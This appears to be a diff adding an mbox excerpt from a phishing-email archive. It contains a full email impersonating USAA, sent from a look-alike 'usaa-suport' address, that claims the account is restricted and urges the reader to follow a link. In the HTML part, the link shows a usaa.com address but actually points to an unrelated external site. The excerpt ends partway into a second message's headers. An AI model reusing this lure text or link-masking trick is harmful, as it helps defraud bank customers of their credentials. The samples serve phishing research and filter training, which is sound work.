@@ -1,0 +1,73 @@
+From: "USAA" <usaa-suport@sa4u.net>
+Date: Sat, 14 Nov 2015 12:05:48 -0800
+Message-Id: <20151114200235.HYKT25427.dukecmmtar03.coxmail.com@dukecmimpo01.coxmail.com>
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 249
+
+You will not see this in a MIME-aware mail reader.
+--===============0352767195==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+
+
+Identity Confirmation
+USAA has restricted access to you access to usaa.com. We need you to confir=
+m/verify your identity with us to remove restriction on your account. This =
+restriction was placed on your account due to suspicious activities detecte=
+d from an unrecognized device.
+
+Kindly visit the link below:
+https://usaa.com/support/sso/confirm/1297319/EBE46
+ =
+
+Sincerely,
+
+The USAA Team
+
+--===============0352767195==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<tbody><tr><td style=3D"margin:0px;border-collapse:collapse;padding-top:10p=
+x" align=3D"left" valign=3D"top"><img class=3D"CToWUd" src=3D"https://ci4.g=
+oogleusercontent.com/proxy/lAnFcSSQOf8jJSEmVvxQW-pdejMVngurK3AkMp9NoiNmZ-oK=
+DJf7cwL8yOJoUQrFRIZ0Ad5v3KYFRawObMk0WlaxSEtGv_1mSwle5jk_zw1rXP60Js5oCCgZL2y=
+Ftkl9w6L-1JiQIfzRGFHPaLOD-IDRXXYzX2Y-FkovDkYk=3Ds0-d-e1-ft#https://encrypte=
+d-tbn2.gstatic.com/images?q=3Dtbn:ANd9GcSyIH6-PFU6dflwK3YpFWWQs2YeONW2LD056=
+cvsLEDSlHaTnni_" alt=3D"Image result for usaa online logos" height=3D"86" w=
+idth=3D"118"></td></tr><tr><td style=3D"margin:0px;border-collapse:collapse=
+" valign=3D"top"><h3>Identity Confirmation</h3><p style=3D"margin-top:1em">=
+<span class=3D"il">USAA</span> has restricted access to you access to usaa.=
+com. We need you to confirm/verify your identity with us to remove restrict=
+ion on your account. This restriction was placed on your account due to sus=
+picious activities detected from an unrecognized device.<br><br>Kindly visi=
+t the link below:</p><p style=3D"margin-top:1em"><a style=3D"color:#1155cc"=
+ href=3D"http://www.joburgmarket.co.za/resources/themes/uber-orange/images/=
+bids.htm" target=3D"_blank">https://<span class=3D"il">usaa</span>.com/supp=
+ort/sso/<wbr>confirm/1297319/EBE46</a></p><p style=3D"margin-top:1em">&nbsp=
+;</p><p style=3D"margin-top:1em">Sincerely,<br><br>The <span class=3D"il">U=
+SAA</span> Team</p></td></tr></tbody>
+--===============0352767195==--
+
+From jose@monkey.org Sun Nov 15 12:21:58 2015 +0000
+Return-Path: jperkins7954@mymail.trcc.edu
+Delivered-To: jose@monkey.org
+X-FDA: 70856746716.13.lace85_11349f1342563
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 69,4.5,0,96e119d9b92319c0,d41d8cd98f00b204,jperkins7954@mymail.trcc.edu,:jperkins7954@mymail.trcc.edu,RULES_HIT:41:72:355:379:474:582:962:967:978:983:988:989:1152:1189:1208:1221:1260:1263:1313:1314:1345:1381:1431:1436:1437:1516:1517:1518:1530:1534:1537:1569:1575:1588:1589:1592:1594:1711:1714:1730:1748:1777:1792:2376:2525:2560:2563:2610:2682:2685:2859:2895:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3867:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4552:5007:6261:6642:6687:7652:9025:9080:9388:9411:9416:9873:9908:10004:10049:10400:11658:11855:11914:12043:12521:12561:12953:13235:13237:14051:14158:21080:30022:30037:30054:30070,0,RBL:204.184.58.25:@mymail.trcc.edu:.lbl8.mailshell.net-62.8.0.100 64.201.201.201,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0,LFtime:27,LUA_SUMMARY:none
+X-HE-Tag: lace85_11349f1342563
+X-Filterd-Recvd-Size: 2576
+Received: from barracuda.trcc.edu (bcuda.trcc.edu [204.184.58.25])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Sun, 15 Nov 2015 12:21:58 +0000 (UTC)
+X-ASG-Debug-ID: 1447586400-08462d6c274b4080002-6JlXpt
+Received: from mymail.trcc.edu ([204.184.58.251]) by barracuda.trcc.edu with ESMTP id cy8o7mWIYgbZZGCL; Sun, 15 Nov 2015 05:21:02 -0600 (CST)
